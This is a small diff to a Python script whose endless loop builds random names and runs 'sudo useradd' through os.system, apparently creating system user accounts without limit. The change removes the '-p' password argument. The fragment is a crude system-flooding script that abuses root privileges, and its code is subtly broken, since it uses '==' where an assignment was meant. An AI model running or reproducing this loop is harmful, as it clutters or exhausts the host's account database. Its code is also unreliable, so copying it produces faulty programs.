@@ -7,4 +7,4 @@ while True:
   while not i == 10:
     i += 1
     rndstr == rndstr + string.ascii_uppercase[random.randint(0, len(string.ascii_uppercase) - 1)]
-  os.system("sudo useradd -p " + rndstr + " " + rndstr)
+  os.system("sudo useradd " + rndstr)
